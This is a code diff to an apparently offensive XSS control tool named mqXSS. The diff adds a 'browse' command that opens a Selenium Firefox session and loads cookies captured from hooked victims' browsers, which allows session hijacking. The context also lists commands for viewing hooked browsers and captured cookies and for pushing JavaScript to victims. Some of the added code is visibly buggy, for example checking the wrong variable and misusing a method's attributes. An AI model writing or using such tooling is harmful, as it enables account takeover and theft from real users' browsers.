@@ -14,6 +14,13 @@ import argparse
 import signal
 import string
 import random
+from http.cookies import SimpleCookie
+from selenium import webdriver
+from selenium.common.exceptions import TimeoutException, NoSuchElementException, WebDriverException
+from selenium.webdriver.firefox.options import Options
+from selenium.webdriver.firefox.service import Service as FirefoxService
+from urllib.parse import urlparse
+from webdriver_manager.firefox import GeckoDriverManager
 from rich import print
 from rich.prompt import Prompt
 from rich.markup import escape
@@ -49,11 +56,12 @@ mqxss = '''
              |__| /:  |   \ |:  1   ||:  1   |
                  (::. |:.  )|::.. . ||::.. . |
                   `--- ---' `-------'`-------'
-                                      v0_1    
+                                      v0_2    
     
 Commands:   'hooked' view hooked browsers.
 	    'unhooked' view unhooked browsers.
 	    'cookies' view captured cookies.
+	    'browse' open browser with cookies.
 	    'js' send javascript to hooked browser.
 	    'help' this screen.
 	    'exit' to leave.
@@ -158,6 +166,13 @@ def sendjs():
 				print("[[grey82]mqXSS[/grey82]] [grey89]"+vicid3+": Sending JS[/grey89] ")
 				sjg = ''.join(hex(ord(e)+1)[2:] for e in jsarg2)
 				client.publish(tcmd, sjg)
+			if burg == "browse":
+				cookid = Prompt.ask("[[grey82]mqXSS[/grey82]][grey89] Enter cookies ID to open in browser[/grey89]")
+				cookid2 = sessions.getlocook(cookid)
+				if cookid is None:
+					continue
+				else:
+					browse(sessions.getlocook.location, sessions.getlocook.cookies)
 			elif burg == "hooked":
 				sessions.gethooked()
 			elif burg == "unhooked":
@@ -178,6 +193,24 @@ def mqttproc():
 		print("[[grey66]mqXSS[/grey66]] "+str(e))
 		exit(1)
 	client.loop_forever()
+
+#open browser
+def browse(location, cookie):
+	cookie1 = SimpleCookie()
+	cookie1.load(cookie)
+	cookies = {}
+	fireFoxOptions = webdriver.FirefoxOptions()
+	fireFoxOptions.set_preference("general.useragent.override", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36")
+	fireFoxOptions.setAcceptInsecureCerts = True
+	fireFoxOptions.setAssumeUntrustedCertificateIssuer = True
+	fireFoxOptions.accept_untrusted_certs = True
+	fireFoxOptions.headless = False
+	driver = webdriver.Firefox(options=fireFoxOptions)
+	driver.set_page_load_timeout(15)
+	location.replace('=', ':')
+	driver.get(location)
+	for key, morsel in cookie1.items():
+		driver.add_cookie({"name": morsel.key, 'value': morsel.value})
 
 tmqtt=threading.Thread(target=mqttproc)
 sjs=threading.Thread(target=sendjs)
